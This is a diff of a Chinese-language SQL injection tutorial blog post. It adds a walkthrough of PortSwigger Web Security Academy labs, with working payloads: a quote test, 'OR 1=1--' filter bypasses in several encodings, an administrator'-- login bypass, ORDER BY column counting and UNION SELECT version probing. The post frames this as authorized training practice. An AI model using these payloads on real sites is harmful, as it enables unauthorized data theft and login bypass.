@@ -6,9 +6,7 @@ tags: [教程, 工具]
 draft: false
 ---
 
-了解 SQL 注入，也同样是一篇笔记。
-
-不过这一篇和上一篇不太一样。上一篇是「读完知道 C 语言的 for 循环长什么样」，这一篇是「你跟着敲，敲完真的能把一个数据库拖干净」。
+这一篇是「你跟着敲，敲完真的能把一个数据库拖干净」。
 
 所以它会长，会长到你不必中途去搜「终端怎么打开」「这个报错是什么意思」。我尽量把每一步都写成四句话：
 
@@ -2386,3 +2384,74 @@ URL 里 `+` 就是空格的编码。想要真的加号，写 `%2b`。
 真实的站点、别人的服务器、公司的生产库 —— 没有书面授权就别碰。渗透测试和犯罪的界限只有一条：**授权**。技术本身没有立场，用技术的人有。
 
 文中的 CVE 编号、影响范围、在野利用情况来自公开的厂商公告、CISA KEV 清单和公开分析报告，只作为案例讲解，不构成任何攻击指导。因个人使用方式不当产生的任何问题，由使用者自行承担。
+
+---
+
+## 十、在公网实例实战一把
+PortSwigger Web Security Academy
+
+这是**真的在公网跑着的网站**，每个 lab 会为你单独启动一台实例：随机域名、真实数据库、真实后端，还有官方判定告诉你打没打进去。
+
+### 1. 创建并打开实例
+
+- 注册（免费，只要邮箱）：https://portswigger.net/users/register
+
+- 打开这一关：https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
+
+- 点页面上的 Access the lab → 你会拿到形如下面的域名：
+
+  ```text
+  https://0a4700e1038f1f9c80b1d2a8004b00a7.web-security-academy.net/
+  ```
+
+  这个域名只有你能用，1 小时后自动销毁，可以随时重新开。
+
+  ![70100f89 f219 4eb8 85a7 d3a41e9d5003](./70100f89-f219-4eb8-85a7-d3a41e9d5003.jpg)
+
+### 2. 正常请求
+
+首页是商品列表。点一个分类（比如 Gifts），地址栏会变成：
+
+```text
+.../filter?category=Gifts
+```
+
+### 3. 先确认注入点
+
+把地址栏最后的 Gifts 改成：
+
+```text
+Gifts'
+```
+
+回车 → 页面显示 Internal Server Error。引号被带进 SQL 了，注入点确认（这一步对应你 DVWA 的第 2 步）。
+
+### 4. 闭合 + 恒真
+
+```text
+.../filter?category=Gifts'+OR+1=1--
+```
+
+回车 → 之前看不见的未发布商品全出来了，页面顶部弹出 Congratulations, you solved the lab!
+
+![73bab13e b252 4939 be7f 023293573fb4](./73bab13e-b252-4939-be7f-023293573fb4.jpg)
++ 是空格的 URL 编码，不能省。-- 如果不生效，按顺序试这几件：
+
+1. Gifts'+OR+1=1--    默认，多数情况直接过
+
+2. Gifts'+OR+1=1--+    结尾空格被吃掉时补一个
+
+3. Gifts'+OR+1=1%23    MySQL/MariaDB，# 当注释
+
+4. Gifts'%20OR%201=1%20--%20    全编码，避免浏览器/代理乱改
+
+### 5. 接着打这四关（正好对应你第四节的顺序）
+
+```text
+.../lab-login-bypass                     用户名填 administrator'--     ← 登录绕过
+.../lab-determine-number-of-columns      用 ' ORDER BY 1-- / 2-- / 3-- 数
+.../lab-find-column-containing-text      union select 1,'a',1--
+.../lab-query-database-type-and-version  union select 1,@@version,1--
+```
+
+每一关都有判定，打完你就有了“在真实站点上完成一次完整注入链”的完整记录，能直接截图写进文章。
